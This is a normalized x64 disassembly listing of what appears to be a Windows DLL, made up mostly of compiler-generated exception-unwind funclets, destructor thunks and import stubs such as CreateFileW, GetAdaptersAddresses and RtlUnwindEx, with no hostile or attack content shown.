cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_1800237c0
mov [ rw-data ] 0x1
sub_1800252ec
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_18002530c
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_1800258a4
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180025a00
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_180025a50
retn
sub_180025a60
retn
sub_180025ac0
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180025ac8
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180025ba4
and [ rw-data ] 0x0
retn
sub_1800267c4
sub rsp 0x28
call sub_180028ac8
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_18001c80c
call sub_180028868
sub_1800268d0
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_1800258a4
sub_180026b18
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_180026ca8
xor r9d r9d
jmp sub_180026b30
sub_180027408
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_180027244
add rsp 0x38
retn
sub_18002789c
sub rsp 0x38
mov rax [ rsp + 0x60 ]
and [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_1800277b0
add rsp 0x38
retn
sub_180028594
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_180028518
sub_180028610
mov ecx 0x2
jmp sub_180020dcc
sub_1800287e4
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180028ac8
mov ecx 0x1
jmp sub_1800289dc
sub_180029084
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_1800290c0
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
GetAdaptersAddresses
jmp [ GetAdaptersAddresses@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
sub_180029da0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x68 ]
call sub_18001c40c
nop
lea rax [ sub_180002071 ]
add rsp 0x20
pop rbp
retn
sub_180029dd0
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_180003a10
sub_180029de0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x30 ]
mov rcx [ rbp + 0x38 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_180029e40
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_180002680
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
lea rcx [ rdx + 0x50 ]
jmp sub_1800027f0
sub_180029ed0
lea rcx [ rdx + 0x20 ]
jmp sub_1800027f0
sub_180029ee0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x78 ]
call sub_18001c40c
nop
lea rax [ sub_180002cbf ]
add rsp 0x20
pop rbp
retn
sub_180029f10
mov rcx [ rdx + 0x88 ]
jmp sub_1800027f0
sub_180029f20
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_18001c40c
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002a010
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
sub_18002a100
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x68 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a1f0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x78 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a210
lea rcx [ rdx + 0x28 ]
jmp sub_180009660
sub_18002a220
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002a240
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x58 ]
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
mov rcx [ rdx + 0x88 ]
jmp sub_1800027f0
sub_18002a270
mov rcx [ rdx + 0x90 ]
jmp j_sub_18001c80c
sub_18002a280
lea rcx [ rdx + 0x28 ]
jmp sub_1800027f0
sub_18002a290
mov rcx [ rdx + 0xa0 ]
jmp j_sub_18001c80c
sub_18002a2a0
lea rcx [ rdx + 0x50 ]
jmp sub_1800027f0
sub_18002a2b0
lea rcx [ rdx + 0x30 ]
jmp sub_1800058f0
sub_18002a2c0
lea rcx [ rdx + 0x50 ]
jmp sub_180009660
sub_18002a2d0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x60 ]
mov rcx [ rbp + 0x58 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a330
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
mov rcx [ rdx + 0x50 ]
jmp sub_180013220
sub_18002a360
mov rcx [ rdx + 0x50 ]
add rcx 0x78
jmp sub_180003a10
sub_18002a370
mov rcx [ rdx + 0x50 ]
add rcx 0xa0
jmp sub_180003a10
sub_18002a390
mov rcx [ rdx + 0x50 ]
add rcx 0xc8
jmp sub_1800068e0
sub_18002a3b0
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a3c0
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a3d0
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a3e0
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a3f0
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a400
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002a410
mov rcx [ rdx + 0x40 ]
jmp sub_180013220
sub_18002a420
mov rcx [ rdx + 0x40 ]
add rcx 0x78
jmp sub_180003a10
sub_18002a430
mov rcx [ rdx + 0x40 ]
add rcx 0xa0
jmp sub_180003a10
sub_18002a450
mov rcx [ rdx + 0x40 ]
add rcx 0xc8
jmp sub_1800068e0
sub_18002a470
mov rcx [ rdx + 0x40 ]
jmp sub_180003630
sub_18002a480
lea rcx [ rdx + 0x70 ]
jmp sub_1800027f0
sub_18002a490
lea rcx [ rdx + 0x20 ]
jmp sub_1800027f0
sub_18002a4a0
lea rcx [ rdx + 0x48 ]
jmp sub_1800027f0
sub_18002a4b0
mov rcx [ rdx + 0x38 ]
jmp sub_180009660
sub_18002a4c0
mov rcx [ rdx + 0x40 ]
jmp j_sub_18001c80c
sub_18002a4d0
lea rcx [ rdx + 0x628 ]
jmp sub_1800035f0
sub_18002a4e0
lea rcx [ rdx + 0x600 ]
jmp sub_1800035f0
sub_18002a560
lea rcx [ rdx + 0x650 ]
jmp sub_180001850
sub_18002a5f0
lea rcx [ rdx + 0x58 ]
jmp sub_1800027f0
sub_18002a670
lea rcx [ rdx + 0x30 ]
jmp sub_180001850
sub_18002a680
lea rcx [ rdx + 0x30 ]
jmp sub_1800035f0
sub_18002a690
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call j_sub_18001c80c#2
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
mov rcx [ rdx + 0x68 ]
jmp sub_180001850
sub_18002a6c0
lea rcx [ rdx + 0x48 ]
jmp sub_180009660
sub_18002a700
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x68 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a760
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
lea rcx [ rdx + 0x20 ]
jmp sub_1800027f0
sub_18002a790
lea rcx [ rdx + 0x68 ]
jmp sub_180001850
sub_18002a7a0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x48 ]
mov rcx [ rbp + 0x58 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a7c0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x58 ]
mov rcx [ rbp + 0x48 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002a7e0
mov rcx [ rdx + 0x40 ]
jmp sub_18000a710
sub_18002a7f0
lea rcx [ rdx + 0x40 ]
jmp sub_180006df0
sub_18002a800
mov rcx [ rdx + 0x158 ]
jmp j_sub_18001c80c
sub_18002a810
mov rcx [ rdx + 0x158 ]
jmp j_sub_18001c80c
sub_18002a820
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_18001c40c
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002a850
mov rcx [ rdx + 0x40 ]
jmp sub_18000a7c0
sub_18002a860
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_18001c294
sub_18002a870
mov rcx [ rdx + 0x60 ]
add rcx 0x18
jmp sub_18001c294
sub_18002a880
mov rcx [ rdx + 0x78 ]
jmp j_sub_18001c80c
sub_18002a890
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002a8b0
mov rcx [ rdx + 0x40 ]
jmp sub_18000bc60
sub_18002a8c0
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_180001850
sub_18002a8d0
mov rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_180001850
sub_18002a8e0
mov rcx [ rdx + 0x40 ]
add rcx 0x60
jmp sub_180001850
sub_18002a8f0
mov rcx [ rdx + 0x40 ]
add rcx 0x88
jmp sub_180001850
sub_18002a910
mov rcx [ rdx + 0x40 ]
add rcx 0xb0
jmp sub_180001850
sub_18002a930
mov rcx [ rdx + 0x48 ]
jmp sub_180009660
sub_18002a940
lea rcx [ rdx + 0x40 ]
jmp sub_180001850
sub_18002a950
lea rcx [ rdx + 0x68 ]
jmp sub_180001850
sub_18002a960
lea rcx [ rdx + 0x50 ]
jmp sub_180001850
sub_18002a970
lea rcx [ rdx + 0xa0 ]
jmp sub_180001850
sub_18002a980
mov rcx [ rdx + 0x48 ]
jmp j_sub_18001c80c
sub_18002a9c0
lea rcx [ rdx + 0xa0 ]
jmp sub_180001850
sub_18002a9d0
lea rcx [ rdx + 0x78 ]
jmp sub_180001850
sub_18002a9e0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002a9f0
mov rcx [ rdx + 0x58 ]
jmp j_sub_18001c80c
sub_18002aa00
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002aa10
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002aa20
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002aa30
lea rcx [ rdx + 0xb0 ]
jmp sub_180001850
sub_18002aa40
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002aa50
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002aa60
lea rcx [ rdx + 0x58 ]
jmp sub_180001850
sub_18002aa70
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002ab60
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002ab70
lea rcx [ rdx + 0x198 ]
jmp sub_180001850
sub_18002ab80
lea rcx [ rdx + 0x148 ]
jmp sub_180001850
sub_18002ab90
lea rcx [ rdx + 0x170 ]
jmp sub_180001850
sub_18002aba0
lea rcx [ rdx + 0x120 ]
jmp sub_180001850
sub_18002abb0
lea rcx [ rdx + 0xd0 ]
jmp sub_180001850
sub_18002abc0
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002abd0
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002abe0
lea rcx [ rdx + 0xf8 ]
jmp sub_180001850
sub_18002abf0
lea rcx [ rdx + 0xd0 ]
jmp sub_180001850
sub_18002ac00
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002ac10
lea rcx [ rdx + 0xf8 ]
jmp sub_180001850
sub_18002ac20
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002ac30
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002ac40
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002ac50
lea rcx [ rdx + 0x30 ]
jmp sub_180001850
sub_18002ac60
lea rcx [ rdx + 0x58 ]
jmp sub_180001850
sub_18002ac70
lea rcx [ rdx + 0x148 ]
jmp sub_180001850
sub_18002ac80
lea rcx [ rdx + 0x120 ]
jmp sub_180001850
sub_18002ac90
lea rcx [ rdx + 0xf8 ]
jmp sub_180001850
sub_18002aca0
lea rcx [ rdx + 0xd0 ]
jmp sub_180001850
sub_18002acb0
mov rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002acc0
mov rcx [ rdx + 0x28 ]
jmp sub_18000bc60
sub_18002acd0
mov rcx [ rdx + 0x28 ]
add rcx 0x10
jmp sub_180001850
sub_18002ace0
mov rcx [ rdx + 0x28 ]
add rcx 0x38
jmp sub_180001850
sub_18002acf0
mov rcx [ rdx + 0x28 ]
add rcx 0x60
jmp sub_180001850
sub_18002ad00
mov rcx [ rdx + 0x28 ]
add rcx 0x88
jmp sub_180001850
sub_18002ad20
mov rcx [ rdx + 0x28 ]
add rcx 0xb0
jmp sub_180001850
sub_18002ad40
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002ad50
mov rcx [ rdx + 0x20 ]
jmp j_sub_18001c80c
sub_18002ad60
mov rcx [ rdx + 0x20 ]
jmp j_sub_18001c80c
sub_18002ad70
mov rcx [ rdx + 0x40 ]
jmp j_sub_18001c80c
sub_18002ad80
lea rcx [ rdx + 0x50 ]
jmp sub_1800035f0
sub_18002ad90
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_180001850
sub_18002ada0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x30
pop rbp
retn
sub_18002adc0
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002add0
mov rcx [ rdx + 0x48 ]
jmp j_sub_18001c80c
sub_18002ade0
mov rcx [ rdx + 0x60 ]
jmp sub_180009660
sub_18002adf0
lea rcx [ rdx + 0x30 ]
jmp sub_180008890
sub_18002ae00
lea rcx [ rdx + 0x158 ]
jmp sub_180001850
sub_18002ae10
lea rcx [ rdx + 0x1a8 ]
jmp sub_180001850
sub_18002ae20
lea rcx [ rdx + 0x1d0 ]
jmp sub_180001850
sub_18002ae30
lea rcx [ rdx + 0xe0 ]
jmp sub_180001850
sub_18002ae40
lea rcx [ rdx + 0x108 ]
jmp sub_180001850
sub_18002ae50
lea rcx [ rdx + 0x130 ]
jmp sub_180001850
sub_18002ae60
lea rcx [ rdx + 0x180 ]
jmp sub_180001850
sub_18002ae70
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002ae90
mov rcx [ rdx + 0x40 ]
jmp sub_180009660
sub_18002aea0
mov rcx [ rdx + 0x70 ]
jmp j_sub_18001c80c
sub_18002aeb0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x30
pop rbp
retn
sub_18002aed0
mov rcx [ rdx + 0x30 ]
jmp sub_180009660
sub_18002aee0
lea rcx [ rdx + 0x68 ]
jmp sub_180008890
sub_18002aef0
lea rcx [ rdx + 0x98 ]
jmp sub_180001850
sub_18002af00
lea rcx [ rdx + 0x58 ]
jmp sub_1800035f0
sub_18002af10
mov rcx [ rdx + 0x20 ]
jmp j_sub_18001c80c
sub_18002af20
lea rcx [ rdx + 0x28 ]
jmp sub_180009660
sub_18002af30
mov rcx [ rdx + 0x38 ]
jmp j_sub_18001c80c
sub_18002af40
lea rcx [ rdx + 0x70 ]
jmp sub_180001850
sub_18002af50
lea rcx [ rdx + 0x48 ]
jmp sub_180001850
sub_18002af60
lea rcx [ rdx + 0x48 ]
jmp sub_180001850
sub_18002af70
lea rcx [ rdx + 0x98 ]
jmp sub_180001850
sub_18002af80
lea rcx [ rdx + 0x98 ]
jmp sub_180001850
sub_18002af90
mov rcx [ rdx + 0x50 ]
jmp sub_180013220
sub_18002afa0
mov rcx [ rdx + 0x50 ]
add rcx 0x50
jmp sub_180011060
sub_18002afb0
mov rcx [ rdx + 0x50 ]
add rcx 0x80
jmp sub_1800052c0
sub_18002afd0
mov rcx [ rdx + 0x50 ]
add rcx 0xb0
jmp sub_180003a10
sub_18002aff0
mov rcx [ rdx + 0x50 ]
add rcx 0xd0
jmp sub_180001850
sub_18002b010
mov rcx [ rdx + 0x50 ]
add rcx 0xf8
jmp sub_180001850
sub_18002b030
mov rcx [ rdx + 0x50 ]
add rcx 0x120
jmp sub_180001850
sub_18002b050
mov rcx [ rdx + 0x50 ]
add rcx 0x148
jmp sub_180001850
sub_18002b070
mov rcx [ rdx + 0x50 ]
add rcx 0x170
jmp sub_180001850
sub_18002b090
mov rcx [ rdx + 0x50 ]
add rcx 0x198
jmp sub_18001c294
sub_18002b0b0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002b0c0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b0d0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b0e0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b0f0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b100
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002b110
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002b120
lea rcx [ rdx + 0x150 ]
jmp sub_180001850
sub_18002b130
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b140
lea rcx [ rdx + 0xd8 ]
jmp sub_180001850
sub_18002b150
lea rcx [ rdx + 0xb0 ]
jmp sub_180001850
sub_18002b160
lea rcx [ rdx + 0x128 ]
jmp sub_180001850
sub_18002b170
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002b180
lea rcx [ rdx + 0x100 ]
jmp sub_180001850
sub_18002b190
mov rcx [ rdx + 0x40 ]
jmp sub_180013220
sub_18002b1a0
mov rcx [ rdx + 0x40 ]
add rcx 0x50
jmp sub_180011060
sub_18002b1b0
mov rcx [ rdx + 0x40 ]
add rcx 0x80
jmp sub_1800052c0
sub_18002b1d0
mov rcx [ rdx + 0x40 ]
add rcx 0xb0
jmp sub_180003a10
sub_18002b1f0
mov rcx [ rdx + 0x40 ]
add rcx 0xd0
jmp sub_180001850
sub_18002b210
mov rcx [ rdx + 0x40 ]
add rcx 0xf8
jmp sub_180001850
sub_18002b230
mov rcx [ rdx + 0x40 ]
add rcx 0x120
jmp sub_180001850
sub_18002b250
mov rcx [ rdx + 0x40 ]
add rcx 0x148
jmp sub_180001850
sub_18002b270
mov rcx [ rdx + 0x40 ]
add rcx 0x170
jmp sub_180001850
sub_18002b290
mov rcx [ rdx + 0x40 ]
add rcx 0x198
jmp sub_18001c294
sub_18002b2b0
mov rcx [ rdx + 0x48 ]
jmp sub_180003630
sub_18002b2c0
mov rcx [ rdx + 0x40 ]
jmp sub_180003630
sub_18002b2d0
mov rcx [ rdx + 0x98 ]
jmp j_sub_18001c80c
sub_18002b2e0
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002b2f0
lea rcx [ rdx + 0x80 ]
jmp sub_180009660
sub_18002b300
mov rcx [ rdx + 0x70 ]
jmp j_sub_18001c80c
sub_18002b310
lea rcx [ rdx + 0x28 ]
jmp sub_1800027f0
sub_18002b320
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b340
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b360
mov rcx [ rdx + 0x58 ]
jmp sub_180009660
sub_18002b370
mov rcx [ rdx + 0x78 ]
jmp sub_1800027f0
sub_18002b380
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b3a0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b3c0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b3e0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b400
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b420
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b440
mov rcx [ rdx + 0x58 ]
jmp sub_180009660
sub_18002b450
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b470
mov rcx [ rdx + 0x40 ]
jmp sub_180003630
sub_18002b480
mov rcx [ rdx + 0x48 ]
jmp j_sub_18001c80c
sub_18002b490
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002b4a0
lea rcx [ rdx + 0x58 ]
jmp sub_180001850
sub_18002b4b0
mov rcx [ rdx + 0x40 ]
jmp sub_180001850
sub_18002b4c0
mov rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002b4d0
mov rcx [ rdx + 0x28 ]
jmp j_sub_18001c80c
sub_18002b4e0
lea rcx [ rdx + 0x48 ]
jmp sub_180001850
sub_18002b4f0
lea rcx [ rdx + 0x70 ]
jmp sub_180001850
sub_18002b500
mov rcx [ rdx + 0x40 ]
jmp sub_180001850
sub_18002b570
mov rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002b5b0
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b5c0
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002b5d0
mov rcx [ rdx + 0x28 ]
jmp sub_180001850
sub_18002b5e0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x28 ]
mov rcx [ rbp + 0x30 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002b660
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x68 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002b680
mov rcx [ rdx + 0x68 ]
jmp sub_180001850
sub_18002b8d0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002b8f0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_1800132f0
add rsp 0x20
pop rbp
retn
sub_18002b910
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
sub_18002b960
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002b970
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b980
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002b990
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002b9a0
lea rcx [ rdx + 0x28 ]
jmp sub_180016d40
sub_18002b9b0
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002b9c0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001850
sub_18002b9d0
lea rcx [ rdx + 0x140 ]
jmp sub_180014bc0
sub_18002b9e0
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002b9f0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001850
sub_18002ba00
lea rcx [ rdx + 0x140 ]
jmp sub_180014bc0
sub_18002ba10
lea rcx [ rdx + 0xf0 ]
jmp sub_180001850
sub_18002ba20
lea rcx [ rdx + 0x190 ]
jmp sub_180001850
sub_18002ba30
lea rcx [ rdx + 0x1c0 ]
jmp sub_180014bc0
sub_18002ba40
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002ba50
lea rcx [ rdx + 0x118 ]
jmp sub_180001850
sub_18002ba60
lea rcx [ rdx + 0x140 ]
jmp sub_180014bc0
sub_18002ba70
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002ba80
lea rcx [ rdx + 0x118 ]
jmp sub_180001850
sub_18002ba90
lea rcx [ rdx + 0x210 ]
jmp sub_180014bc0
sub_18002baa0
lea rcx [ rdx + 0x48 ]
jmp sub_180008890
sub_18002bab0
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002bac0
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002bad0
lea rcx [ rdx + 0x20 ]
jmp sub_1800132f0
sub_18002bae0
lea rcx [ rdx + 0x28 ]
jmp j_sub_180002680
sub_18002baf0
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002bb00
lea rcx [ rdx + 0x80 ]
jmp sub_180001850
sub_18002bb10
lea rcx [ rdx + 0xa8 ]
jmp sub_180001850
sub_18002bb20
lea rcx [ rdx + 0x30 ]
jmp j_sub_180002680
sub_18002bb30
mov rcx [ rdx + 0x50 ]
jmp j_sub_18001c80c
sub_18002bb40
lea rcx [ rdx + 0x1d8 ]
jmp sub_180001850
sub_18002bb50
lea rcx [ rdx + 0xe8 ]
jmp sub_180001850
sub_18002bb60
lea rcx [ rdx + 0x110 ]
jmp sub_180001850
sub_18002bb70
lea rcx [ rdx + 0x1b0 ]
jmp sub_180001850
sub_18002bb80
lea rcx [ rdx + 0x138 ]
jmp sub_180001850
sub_18002bb90
lea rcx [ rdx + 0x160 ]
jmp sub_180001850
sub_18002bba0
lea rcx [ rdx + 0x188 ]
jmp sub_180001850
sub_18002bbb0
lea rcx [ rdx + 0x1d8 ]
jmp sub_180001850
sub_18002bbc0
lea rcx [ rdx + 0x110 ]
jmp sub_180001850
sub_18002bbd0
lea rcx [ rdx + 0xe8 ]
jmp sub_180001850
sub_18002bbe0
lea rcx [ rdx + 0x188 ]
jmp sub_180001850
sub_18002bbf0
lea rcx [ rdx + 0x160 ]
jmp sub_180001850
sub_18002bc00
lea rcx [ rdx + 0x138 ]
jmp sub_180001850
sub_18002bc10
lea rcx [ rdx + 0x1b0 ]
jmp sub_180001850
sub_18002bc20
lea rcx [ rdx + 0xe8 ]
jmp sub_180001850
sub_18002bc30
lea rcx [ rdx + 0xe8 ]
jmp sub_180001850
sub_18002bc40
mov rcx [ rdx + 0x50 ]
jmp sub_180012ba0
sub_18002bc50
mov rcx [ rdx + 0x50 ]
add rcx 0x10
jmp sub_180001850
sub_18002bc60
mov rcx [ rdx + 0x50 ]
add rcx 0x48
jmp sub_180001850
sub_18002bc70
mov rcx [ rdx + 0x50 ]
add rcx 0x70
jmp sub_180001850
sub_18002bc80
mov rcx [ rdx + 0x50 ]
add rcx 0x98
jmp sub_180001850
sub_18002bca0
mov rcx [ rdx + 0x50 ]
add rcx 0xd0
